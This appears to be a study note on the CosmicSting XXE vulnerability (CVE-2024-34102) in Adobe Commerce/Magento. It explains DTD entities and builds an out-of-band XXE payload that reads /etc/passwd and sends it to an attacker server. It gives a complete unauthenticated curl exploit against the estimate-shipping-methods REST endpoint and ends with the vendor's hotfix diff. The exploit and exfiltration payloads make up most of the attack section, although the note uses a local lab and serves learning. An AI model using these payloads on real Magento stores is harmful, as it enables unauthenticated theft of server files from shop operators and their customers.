# Sources
- https://helpx.adobe.com/security/products/magento/apsb24-40.html
- https://www.vicarius.io/vsociety/posts/cosmicsting-critical-unauthenticated-xxe-vulnerability-in-adobe-commerce-and-magento-cve-2024-34102
- https://www.youtube.com/watch?v=gjm6VHZa_8s

# What is XML XXE Injection?
- XML Externel Entity Injection

# How does it work?

- XML DTD defines the structure, elements, attributes of XML documents ("ELEMENT")
- DTD can define entities ("ENTITY") - storage units for values
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ELEMENT person (firstname,lastname)>
<!ELEMENT firstname (#PCDATA)>
<!ELEMENT lastname (#PCDATA)>
<!ENTITY lastname "Bumbler">
]>
<person>
  <firstname>Billy</firstname>
  <lastname>&lastname;</lastname>  
</person>
```

- DTD entities can be general entities ("&") or parameter entites ("%")
- general entities are primarily used inside the document itself
- parameter entities can only be read inside DTDs and allow its values to be entities
```
<!DOCTYPE note [
<!ENTITY % parameter_entity "<!ENTITY general_entity 'bar'>">
%parameter_entity;
]>
<foo>&general_entity;</foo>
```

- XML DTD can be obtained from external sources -> keyword SYSTEM
- external source can be file, URI ...
```
<!DOCTYPE foo SYSTEM "local/file/some.dtd">
```

- now we can read the contents of a file from the local FS
- and we can substitute part of a URL on our attack server with that content
```
<!DOCTYPE xxe [
<!ENTITY % data SYSTEM "/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attackserver?%data;'>">
%param1;
]>
<foo>&exfil;</foo>
```

- this does per specification of DTD NOT work with inline DTDs but with external DTDs -> now we have to reference a dtd on our attack server in our XML
- External DTD at http://attackserver/dtd.xml:
```
<!ENTITY % data SYSTEM "/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attackserver?%data;'>">
```
- XML in request
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM \"http://attackserver/dtd.xml\">
%sp;
%param1;
]>
<r>&exfil;</r>
```

- this is called an out of band XXE Injection

# Types of XXE

- inband -> response contains the critial data
- out of band -> response does NOT contain critical datah
- error based -> error is thrown containing the critical data

# Wait what?? What does that have to do with the Magento REST API?!?!?!

- Magento REST API deserializes in a very generic manner that is not secure
- When deserializing a non-scalar object like "product" it tries to match the given child-parameters to a) setter functions or b) constructor arguments
- there is no validation if those should be user facing or not
```
"product": {
    "id": 0,
    "sku": "string",
    "name": "string",
    ...
    "product_links": [{
        "sku": "string",
        "link_type": "string",
        ...
```
- that is why we can do this for rest/V1/guest-carts/test-assetnote/estimate-shipping-methods
```
"address": {
  "totalsReader": {
  "collectorList": {
  "totalCollector": {
  "sourceData": {
```
- rest/V1/guest-carts/test-assetnote/estimate-shipping-methods does not require authentication
- sourceData extends SimpleXmlElement which includes dataIsURL parameter that enables XXE
- dataIsURL even had a bug that allowed for XXE without dataIsURL=true
- options = 16 means that DTD usage is enabled
```
  "address": {
  "totalsReader": {
  "collectorList": {
  "totalCollector": {
  "sourceData": {
  "data": "<?xml version=\"1.0\" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % ext SYSTEM \"http://10.0.2.15:6667/dtd.xml\"> %ext; %param1; ]> <r>&exfil;</r>",
  "options": 16
```

# Perform le exploit!

- start local Magento with vulnerable version
- start local attack server
- perform curl request as seen below
```
curl -k -X POST \
  https://eckart.docker/rest/all/V1/guest-carts/test-assetnote/estimate-shipping-methods \
  -H "Accept: application/json, text/javascript, */*; q=0.01" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: application/json" \
  -d '{
  "address": {
  "totalsReader": {
  "collectorList": {
  "totalCollector": {
  "sourceData": {
  "data": "<?xml version=\"1.0\" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY % ext SYSTEM \"http://10.0.2.15:6667/dtd.xml\"> %ext; %param1; ]> <r>&exfil;</r>",
  "options": 16
  }}}}}}'
```

# Hotfix in Magento
- if webapi request contains SimpleXMLElement or DOMElement throw error
```
diff --git a/vendor/magento/framework/Webapi/ServiceInputProcessor.php b/vendor/magento/framework/Webapi/ServiceInputProcessor.php
index 9d7fd443508..65987772c23 100644
--- a/vendor/magento/framework/Webapi/ServiceInputProcessor.php
+++ b/vendor/magento/framework/Webapi/ServiceInputProcessor.php
@@ -275,6 +275,12 @@ class ServiceInputProcessor implements ServicePayloadConverterInterface
         // convert to string directly to avoid situations when $className is object
         // which implements __toString method like \ReflectionObject
         $className = (string) $className;
+        if (is_subclass_of($className, \SimpleXMLElement::class)
+            || is_subclass_of($className, \DOMElement::class)) {
+            throw new SerializationException(
+                new Phrase('Invalid data type')
+            );
+        }
         $class = new ClassReflection($className);
         if (is_subclass_of($className, self::EXTENSION_ATTRIBUTES_TYPE)) {
             $className = substr($className, 0, -strlen('Interface'));
```
